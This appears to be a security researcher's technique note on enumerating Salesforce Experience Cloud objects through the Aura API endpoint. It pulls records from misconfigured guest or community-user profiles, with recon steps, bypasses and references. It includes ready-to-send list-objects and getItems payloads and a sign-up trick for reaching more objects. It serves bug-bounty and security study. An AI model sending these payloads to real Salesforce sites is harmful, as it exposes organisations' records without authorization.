---
title: Salesforce Aura API object enumeration and record dump
slug: salesforce-aura-object-enumeration
created_utc: 2026-05-14T00:00:00Z
updated_utc: 2026-05-14T00:00:00Z
tags: [technique/server-side, technique/saas, technique/salesforce, sink/aura-api]
inbound: []
---

# Salesforce Aura API object enumeration and record dump

## Pattern

Any Salesforce Experience / Lightning Community site exposes the Aura
framework's RPC endpoint at `/s/sfsites/aura` (or `/aura`). The endpoint
accepts a fixed JSON payload format that calls a named Apex method on a
named Apex class. Two vendor-provided Apex classes leak all the
information needed to dump records:

1. **List-all-objects payload** — calls a built-in Aura-enabled method
   that returns every SObject name (default + custom) for the tenant.
2. **Get-records payload** — calls another vendor-provided method with
   `entityNameOrId=<marker>`; `<marker>` is iterated through every name
   from step 1.

If the customer has misconfigured object-level / field-level access
controls (`Read` granted to the guest or community-user profile on
sensitive objects), the second payload dumps record bodies
unauthenticated. The same payload format has been valid since the
original 2020 disclosure.

## Preconditions

- Target site is a Salesforce Lightning Community / Experience Cloud
  site (paths like `/s/`, `aura?r=N`, hostnames `*.force.com`,
  `*.my.site.com`).
- Guest profile or community-user profile has Read on at least one
  sensitive object.
- Aura API enabled (default).

## Detection

- Recon: search Caido / Burp history for `/aura?r=` or
  `/s/sfsites/aura`.
- Fingerprint: send the list-objects payload — a JSON response with a
  long `entities` array of SObject names is a positive hit.
- Sort response sizes by largest after iterating get-records — biggest
  responses are the most-populated leaked objects.

## Triggering

List objects (POST to `/s/sfsites/aura?r=1&aura.ApexAction.execute=1`):
```
message=%7B%22actions%22%3A%5B%7B%22id%22%3A%22123%22%2C%22descriptor%22%3A%22apex%3A%2F%2FObjectInfoController%2FACTION%24getRecentlyCreated%22%2C%22callingDescriptor%22%3A%22UNKNOWN%22%2C%22params%22%3A%7B%7D%7D%5D%7D
```
(Use the canonical payloads at enumerated.ie — slug
`salesforce-lightning-aura-controllers-for-anonymous-data-exposure`.)

Dump records:
```
{"actions":[{"id":"1","descriptor":"apex://SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"layoutType":"FULL","entityNameOrId":"<OBJECT_NAME>","retrieveAllRecords":true}}]}
```

## Bypasses

- 2024 Salesforce hardening blocks the same payload from accessing
  Custom Settings; record access still works.
- If guest profile is locked, sign up as a community user (any public
  signup form on the same site) and re-run — community-user role
  exposes more objects.
- For custom Apex methods, manually pull the JS bundle and search for
  `controller://` to find class+method names; craft a payload with
  matching `params`.

## Seen in the wild

- {date: 2025-01-30, source: CT Ep 108} — Aaron Costello: "I found this on a
  program like two weeks ago" — payload format unchanged since 2020.

## References

- enumerated.ie — Salesforce Aura object enumeration writeup (2020)
- AppOmni Apex whitepaper
- Critical Thinking Podcast Ep 108
- Related: [[salesforce-apex-without-sharing]], [[salesforce-named-credential-bruteforce]]
